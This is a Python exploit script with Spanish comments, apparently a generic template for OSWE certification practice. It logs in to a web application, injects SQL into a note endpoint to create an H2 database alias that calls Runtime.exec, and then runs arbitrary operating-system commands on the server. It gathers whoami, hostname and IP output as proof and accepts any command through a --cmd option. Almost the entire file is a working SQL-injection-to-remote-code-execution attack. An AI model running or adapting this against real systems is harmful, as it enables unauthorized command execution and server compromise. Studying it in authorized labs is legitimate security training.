#!/usr/bin/env python3
"""
Exploit RCE - Plantilla genérica para SQL Injection a RCE
SQL Injection + CREATE ALIAS en H2 Database para ejecutar comandos del sistema

NOTA IMPORTANTE:
Esta técnica es específica para H2 Database, una base de datos en Java que permite crear
funciones Java personalizadas mediante CREATE ALIAS. Esto es poco común en otras bases de
datos como MySQL, PostgreSQL, etc., ya que:
- H2 Database soporta CREATE ALIAS para definir funciones Java directamente en SQL
- Permite ejecutar código Java arbitrario, incluyendo Runtime.getRuntime().exec()
- Esto convierte una SQL Injection en RCE sin necesidad de otras técnicas

La mayoría de bases de datos no permiten esta funcionalidad, por lo que esta técnica
solo funciona cuando la aplicación usa H2 Database (común en aplicaciones Java/Spring Boot
en desarrollo o entornos embebidos).

Uso:
    python exploit_rce.py --ip 192.168.1.100 --port 8080 --user admin --password pass123
    python exploit_rce.py --ip 192.168.1.100 --port 8080 --user admin --password pass123 --cmd "whoami"
    python exploit_rce.py --ip 192.168.1.100 --port 8080 --user admin --password pass123 --verbose --proxy http://127.0.0.1:8080
"""

import requests
import re
import sys
import argparse
import logging
from typing import Optional, Dict, Any, List
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

class RCExploit:
    """
    Clase principal para explotar vulnerabilidad RCE mediante SQL Injection.
    Encapsula todo el estado y operaciones del exploit.
    Plantilla genérica para OSWE.
    
    IMPORTANTE: Esta implementación está diseñada específicamente para H2 Database.
    H2 es una base de datos escrita en Java que permite crear funciones Java mediante
    CREATE ALIAS, lo cual es una característica única que permite convertir SQL Injection
    directamente en RCE. Esta técnica NO funciona con bases de datos tradicionales como
    MySQL, PostgreSQL, MSSQL, Oracle, etc.
    
    Para identificar si una aplicación usa H2 Database:
    - Buscar en código fuente: "h2database", "jdbc:h2:", "H2Dialect"
    - Verificar en application.properties: "spring.datasource.url=jdbc:h2:"
    - Errores de SQL que mencionen H2
    - Aplicaciones Java/Spring Boot en desarrollo o entornos embebidos
    """
    
    def __init__(self, target: str, username: str, password: str, proxy: Optional[str] = None, verbose: bool = False):
        """
        Inicializa el exploit con la configuración del target.
        
        Args:
            target: URL base del target (ej: http://192.168.1.100:8080)
            username: Nombre de usuario para login
            password: Contraseña para login
            proxy: URL del proxy opcional (ej: http://127.0.0.1:8080)
            verbose: Si es True, muestra información detallada de debugging
        """
        self.target = target.rstrip('/')
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.logged_in = False
        self.rce_enabled = False
        
        # Configurar logging
        log_level = logging.DEBUG if verbose else logging.INFO
        logging.basicConfig(
            level=log_level,
            format='%(asctime)s - %(levelname)s - %(message)s',
            datefmt='%H:%M:%S'
        )
        self.logger = logging.getLogger(__name__)
        
        # Configurar sesión HTTP con reintentos
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[500, 502, 503, 504],
            allowed_methods=["POST", "GET"]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        # Configurar proxy si se proporciona
        if proxy:
            self.session.proxies = {
                "http": proxy,
                "https": proxy
            }
            self.logger.info(f"Proxy configurado: {proxy}")
        
        # Headers por defecto
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def login(self) -> bool:
        """
        Realiza login en la aplicación y valida que la sesión sea válida.
        
        Returns:
            True si el login fue exitoso y la sesión es válida, False en caso contrario
        """
        self.logger.info(f"Iniciando sesión como usuario: {self.username}")
        
        login_url = f"{self.target}/login"
        login_data = {
            "username": self.username,
            "password": self.password
        }
        
        try:
            response = self.session.post(
                login_url,
                data=login_data,
                allow_redirects=False,
                timeout=10
            )
            
            # Login exitoso retorna 302 (redirect)
            if response.status_code == 302:
                self.logger.info("Login exitoso (302 redirect)")
                
                # Validar que la sesión es realmente válida accediendo a un endpoint protegido
                if self._validate_session():
                    self.logged_in = True
                    self.logger.info("Sesión validada correctamente")
                    return True
                else:
                    self.logger.error("Login exitoso pero sesión no válida")
                    return False
            else:
                self.logger.error(f"Login falló: Status {response.status_code}")
                self.logger.debug(f"Response: {response.text[:200]}")
                return False
                
        except requests.exceptions.RequestException as e:
            self.logger.error(f"Error en login: {e}")
            return False
    
    def _validate_session(self) -> bool:
        """
        Valida que la sesión sea válida accediendo a un endpoint protegido.
        Ajustar la URL del endpoint según la aplicación target.
        
        Returns:
            True si la sesión es válida, False en caso contrario
        """
        try:
            # Intentar acceder a un endpoint que requiere autenticación
            # Ajustar la URL según la aplicación target
            response = self.session.get(f"{self.target}/api/notes", timeout=10)
            
            if response.status_code == 200:
                self.logger.debug("Sesión válida: endpoint protegido accesible")
                return True
            elif response.status_code == 401:
                self.logger.warning("Sesión inválida: endpoint retornó 401")
                return False
            else:
                self.logger.warning(f"Validación de sesión: status inesperado {response.status_code}")
                return False
                
        except requests.exceptions.RequestException as e:
            self.logger.warning(f"Error validando sesión: {e}")
            return False
    
    def execute_sql(self, payload: str) -> Optional[requests.Response]:
        """
        Ejecuta un payload SQL usando SQL Injection en el endpoint vulnerable.
        Ajusta la URL y parámetros según la aplicación target.
        
        Args:
            payload: String con el payload SQL a ejecutar
        
        Returns:
            Response object o None si hay error
        """
        if not self.logged_in:
            self.logger.error("No hay sesión activa. Ejecuta login() primero.")
            return None
        
        # Ajustar URL y parámetro según la aplicación target
        url = f"{self.target}/api/note"  # Cambiar según endpoint vulnerable
        data = {"name": payload}  # Cambiar nombre del parámetro según corresponda
        
        try:
            self.logger.debug(f"Ejecutando SQL payload (primeros 100 chars): {payload[:100]}...")
            response = self.session.post(url, data=data, timeout=15)
            return response
            
        except requests.exceptions.RequestException as e:
            self.logger.error(f"Error ejecutando SQL: {e}")
            return None
    
    def create_rce_alias(self, max_retries: int = 2) -> bool:
        """
        Crea un alias EXEC_CMD en H2 database para habilitar RCE.
        Maneja el caso donde el alias ya existe.
        
        IMPORTANTE: Este método es ESPECÍFICO para H2 Database (base de datos en Java).
        No funcionará con otras bases de datos como MySQL, PostgreSQL, MSSQL, etc.
        
        H2 Database es especial porque:
        - Permite CREATE ALIAS para definir funciones Java directamente en SQL
        - Estas funciones pueden ejecutar código Java arbitrario
        - Runtime.getRuntime().exec() permite ejecutar comandos del sistema operativo
        - Esto convierte SQL Injection directamente en RCE (algo poco común)
        
        En otras bases de datos, necesitarías técnicas diferentes como:
        - MySQL: INTO OUTFILE, LOAD_FILE (limitado), UDF (más complejo)
        - PostgreSQL: COPY TO, pg_read_file (limitado), extensions CUSTOM
        - MSSQL: xp_cmdshell (requiere privilegios específicos)
        
        Args:
            max_retries: Número máximo de intentos
        
        Returns:
            True si el alias está disponible (creado o ya existía), False en caso contrario
        """
        self.logger.info("Creando alias EXEC_CMD para RCE...")
        self.logger.info("Nota: Esta técnica solo funciona con H2 Database (Java)")
        
        # Payload para crear el alias en H2 database
        # CREATE ALIAS crea una función Java que podemos llamar desde SQL
        # La función ejecuta Runtime.getRuntime().exec() para ejecutar comandos del sistema
        # \\A es un delimitador regex que lee toda la salida de una vez
        payload = "test'; CREATE ALIAS EXEC_CMD AS 'String exec(String cmd) throws Exception { Process p = Runtime.getRuntime().exec(cmd); java.util.Scanner s = new java.util.Scanner(p.getInputStream()).useDelimiter(\"\\\\A\"); return s.hasNext() ? s.next() : \"\";}' --"
        
        for attempt in range(max_retries):
            self.logger.debug(f"Intento {attempt + 1}/{max_retries}")
            response = self.execute_sql(payload)
            
            if response:
                if response.status_code == 200:
                    try:
                        data = response.json()
                        self.logger.info("Alias EXEC_CMD creado o ya existente")
                        self.rce_enabled = True
                        return True
                    except ValueError:
                        # Si no es JSON, puede ser que el alias se creó pero no hay respuesta JSON
                        self.logger.info("Alias creado (respuesta no JSON)")
                        self.rce_enabled = True
                        return True
                        
                elif response.status_code == 500:
                    # Error 500 puede significar que el alias ya existe o error SQL
                    error_text = response.text.lower()
                    if "already exists" in error_text or "duplicate" in error_text or "name already exists" in error_text:
                        self.logger.info("Alias ya existe, continuando...")
                        self.rce_enabled = True
                        return True
                    else:
                        # Si es error 500, puede ser que el alias ya existe y está causando conflicto
                        # Intentar verificar si el alias funciona en lugar de crearlo de nuevo
                        self.logger.warning(f"Error 500 al crear alias. Verificando si ya existe...")
                        if self._verify_alias_exists():
                            self.logger.info("Alias ya existe y está funcional, continuando...")
                            self.rce_enabled = True
                            return True
                        
                        self.logger.warning(f"Error 500 al crear alias: {response.text[:200]}")
                        if attempt < max_retries - 1:
                            continue
                else:
                    self.logger.warning(f"Status inesperado al crear alias: {response.status_code}")
                    if attempt < max_retries - 1:
                        continue
            else:
                # Si no hay respuesta, puede ser que el alias ya existe y está causando problemas
                # Intentar verificar si funciona
                self.logger.debug("No se obtuvo respuesta, verificando si el alias ya existe...")
                if self._verify_alias_exists():
                    self.logger.info("Alias ya existe y está funcional, continuando...")
                    self.rce_enabled = True
                    return True
                if attempt < max_retries - 1:
                    continue
        
        # Último intento: verificar si el alias funciona aunque falle la creación
        self.logger.info("Verificando si el alias EXEC_CMD ya existe y funciona...")
        if self._verify_alias_exists():
            self.logger.info("Alias ya existe y está funcional")
            self.rce_enabled = True
            return True
        
        self.logger.error("No se pudo crear o verificar el alias EXEC_CMD")
        return False
    
    def _verify_alias_exists(self) -> bool:
        """
        Verifica si el alias EXEC_CMD ya existe intentando ejecutar un comando simple.
        
        Returns:
            True si el alias existe y funciona, False en caso contrario
        """
        try:
            # Intentar ejecutar un comando simple para verificar si el alias funciona
            test_payload = "test' UNION SELECT NULL,EXEC_CMD('echo test'),NULL--"
            response = self.execute_sql(test_payload)
            
            if response and response.status_code == 200:
                try:
                    data = response.json()
                    # Si obtenemos una respuesta válida, el alias existe
                    if isinstance(data, list) and len(data) > 0:
                        return True
                except ValueError:
                    # Incluso si no es JSON válido, si no es error 500, el alias puede existir
                    return True
        except Exception as e:
            self.logger.debug(f"Error verificando alias: {e}")
        
        return False
    
    def execute_command(self, command: str) -> Optional[str]:
        """
        Ejecuta un comando del sistema usando el alias EXEC_CMD.
        
        Args:
            command: Comando a ejecutar (sin pipes ni redirecciones complejas)
        
        Returns:
            Salida del comando como string, o None si hay error
        """
        if not self.rce_enabled:
            self.logger.error("RCE no está habilitado. Ejecuta create_rce_alias() primero.")
            return None
        
        # Validar que el comando no contenga caracteres peligrosos que requieren shell
        # En OSWE, es mejor ejecutar comandos simples directamente
        if any(char in command for char in ['|', '&', ';', '`', '$', '<', '>', '(', ')']):
            self.logger.warning(f"Comando contiene caracteres que pueden requerir shell: {command}")
            self.logger.warning("Considera usar comandos más simples o ejecutar directamente")
        
        self.logger.info(f"Ejecutando comando: {command}")
        
        # Usar UNION SELECT - ajustar número de columnas según la tabla target
        # Ejemplo: si la tabla tiene 3 columnas, usar NULL,EXEC_CMD(...),NULL
        # Cambiar 'test' por un valor que exista en la tabla o usar técnica sin UNION si es necesario
        payload = f"test' UNION SELECT NULL,EXEC_CMD('{command}'),NULL--"
        
        response = self.execute_sql(payload)
        
        if response and response.status_code == 200:
            try:
                data = response.json()
                
                # Parseo robusto: no asumir estructura específica
                if isinstance(data, list) and len(data) > 0:
                    # Recorrer todas las filas buscando el resultado
                    for row in data:
                        if isinstance(row, dict):
                            # Buscar el resultado en diferentes campos posibles
                            result = row.get("Name") or row.get("name") or row.get("Note") or row.get("note")
                            if result and str(result).strip():
                                self.logger.debug(f"Resultado obtenido: {str(result)[:100]}...")
                                return str(result)
                    
                    self.logger.warning("Respuesta JSON vacía o sin datos útiles")
                    self.logger.debug(f"Respuesta completa: {data}")
                else:
                    self.logger.warning(f"Respuesta JSON inválida: {data}")
                    
            except (ValueError, KeyError, TypeError) as e:
                self.logger.error(f"Error parseando respuesta JSON: {e}")
                self.logger.debug(f"Response text: {response.text[:500]}")
        else:
            if response:
                self.logger.error(f"Error ejecutando comando: Status {response.status_code}")
                self.logger.debug(f"Response: {response.text[:300]}")
            else:
                self.logger.error("No se obtuvo respuesta del servidor")
        
        return None
    
    def verify_rce(self) -> Dict[str, Optional[str]]:
        """
        Verifica que RCE funciona ejecutando comandos de evidencia.
        Ejecuta whoami, hostname y obtiene la IP del sistema.
        
        Returns:
            Diccionario con los resultados de los comandos de verificación
        """
        self.logger.info("Verificando RCE con comandos de evidencia...")
        
        evidence = {}
        
        # Comando 1: whoami - muestra el usuario actual
        self.logger.info("Ejecutando 'whoami'...")
        result = self.execute_command("whoami")
        evidence["whoami"] = result.strip() if result else None
        
        # Comando 2: hostname - muestra el nombre del host
        self.logger.info("Ejecutando 'hostname'...")
        result = self.execute_command("hostname")
        evidence["hostname"] = result.strip() if result else None
        
        # Comando 3: IP address - obtenemos la IP usando diferentes métodos
        # Evitamos usar pipes (|) ya que pueden requerir shell
        self.logger.info("Obteniendo IP del sistema...")
        
        # Método 1: hostname -I (Linux, más simple, sin pipes)
        result = self.execute_command("hostname -I")
        if result and result.strip():
            # Puede retornar múltiples IPs, tomar la primera
            ip_parts = result.strip().split()
            if ip_parts:
                evidence["ip"] = ip_parts[0]
        else:
            # Método 2: ip addr (sin pipes, solo listar interfaces)
            result = self.execute_command("ip addr")
            if result:
                # Buscar la primera IP que no sea 127.0.0.1
                ip_matches = re.findall(r'inet\s+(\d+\.\d+\.\d+\.\d+)', result)
                for ip in ip_matches:
                    if not ip.startswith('127.'):
                        evidence["ip"] = ip
                        break
            else:
                # Método 3: ifconfig (fallback para sistemas más antiguos)
                result = self.execute_command("ifconfig")
                if result:
                    ip_matches = re.findall(r'inet\s+(\d+\.\d+\.\d+\.\d+)', result)
                    for ip in ip_matches:
                        if not ip.startswith('127.'):
                            evidence["ip"] = ip
                            break
        
        if "ip" not in evidence or not evidence["ip"]:
            evidence["ip"] = None
            self.logger.warning("No se pudo obtener la IP del sistema")
        
        return evidence


def setup_logging(verbose: bool):
    """Configura el sistema de logging."""
    level = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(
        level=level,
        format='%(asctime)s - %(levelname)s - %(message)s',
        datefmt='%H:%M:%S'
    )


def parse_arguments():
    """Parsea los argumentos de la línea de comandos."""
    parser = argparse.ArgumentParser(
        description="Exploit RCE - SQL Injection a RCE mediante H2 Database CREATE ALIAS",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  # Verificación automática de RCE (whoami, hostname, IP)
  python exploit_rce.py --ip 192.168.1.100 --port 8080 --user admin --password pass123
  
  # Ejecutar comando específico
  python exploit_rce.py --ip 192.168.1.100 --port 8080 --user admin --password pass123 --cmd "ls -la"
  
  # Modo verbose con proxy (Burp Suite)
  python exploit_rce.py -i 192.168.1.100 -p 8080 -u admin -P pass123 --verbose --proxy http://127.0.0.1:8080
        """
    )
    
    parser.add_argument(
        '--ip', '-i',
        required=True,
        help='IP del servidor target'
    )
    
    parser.add_argument(
        '--port', '-p',
        required=True,
        type=int,
        help='Puerto del servidor'
    )
    
    parser.add_argument(
        '--user', '-u',
        required=True,
        help='Nombre de usuario para login'
    )
    
    parser.add_argument(
        '--password', '-P',
        required=True,
        help='Contraseña para login'
    )
    
    parser.add_argument(
        '--cmd', '-c',
        help='Ejecutar un comando específico (modo manual)'
    )
    
    parser.add_argument(
        '--proxy',
        help='URL del proxy (ej: http://127.0.0.1:8080 para Burp Suite)'
    )
    
    parser.add_argument(
        '--verbose', '-v',
        action='store_true',
        help='Mostrar información detallada de debugging'
    )
    
    return parser.parse_args()


def main():
    """Función principal del exploit."""
    args = parse_arguments()
    
    # Configurar logging
    setup_logging(args.verbose)
    logger = logging.getLogger(__name__)
    
    # Construir URL del target
    target = f"http://{args.ip}:{args.port}"
    
    logger.info("=" * 70)
    logger.info("Exploit RCE - SQL Injection to RCE")
    logger.info("=" * 70)
    logger.info(f"Target: {target}")
    logger.info(f"Usuario: {args.user}")
    logger.info(f"Contraseña: {'*' * len(args.password)}")
    
    # Crear instancia del exploit
    exploit = RCExploit(
        target=target,
        username=args.user,
        password=args.password,
        proxy=args.proxy,
        verbose=args.verbose
    )
    
    # PASO 1: Login
    logger.info("\n[PASO 1] Iniciando sesión...")
    if not exploit.login():
        logger.error("No se pudo iniciar sesión. Abortando.")
        return 1
    
    # PASO 2: Crear alias RCE
    logger.info("\n[PASO 2] Habilitando RCE...")
    if not exploit.create_rce_alias():
        logger.error("No se pudo habilitar RCE. Abortando.")
        return 1
    
    # PASO 3: Ejecutar comando o verificar RCE
    if args.cmd:
        # Modo manual: ejecutar comando específico
        logger.info(f"\n[PASO 3] Ejecutando comando: {args.cmd}")
        result = exploit.execute_command(args.cmd)
        if result:
            logger.info("\n" + "=" * 70)
            logger.info("RESULTADO:")
            logger.info("=" * 70)
            print(result)
            return 0
        else:
            logger.error("No se pudo ejecutar el comando")
            return 1
    else:
        # Modo automático: verificar RCE con comandos de evidencia
        logger.info("\n[PASO 3] Verificando RCE con comandos de evidencia...")
        
        evidence = exploit.verify_rce()
        
        # Mostrar evidencia de RCE
        logger.info("\n" + "=" * 70)
        logger.info("EVIDENCIA DE RCE (Remote Code Execution)")
        logger.info("=" * 70)
        
        success = True
        
        if evidence.get("whoami"):
            logger.info(f"Usuario actual: {evidence['whoami']}")
            print(f"[+] Usuario: {evidence['whoami']}")
        else:
            logger.error("No se pudo obtener 'whoami'")
            success = False
        
        if evidence.get("hostname"):
            logger.info(f"Hostname: {evidence['hostname']}")
            print(f"[+] Hostname: {evidence['hostname']}")
        else:
            logger.error("No se pudo obtener 'hostname'")
            success = False
        
        if evidence.get("ip"):
            logger.info(f"IP del sistema: {evidence['ip']}")
            print(f"[+] IP: {evidence['ip']}")
        else:
            logger.warning("No se pudo obtener la IP del sistema")
        
        if success:
            logger.info("\n[+] RCE verificado exitosamente")
            logger.info("Puedes usar --cmd para ejecutar comandos adicionales")
            return 0
        else:
            logger.error("\n[!] RCE no se pudo verificar completamente")
            return 1


if __name__ == "__main__":
    sys.exit(main())
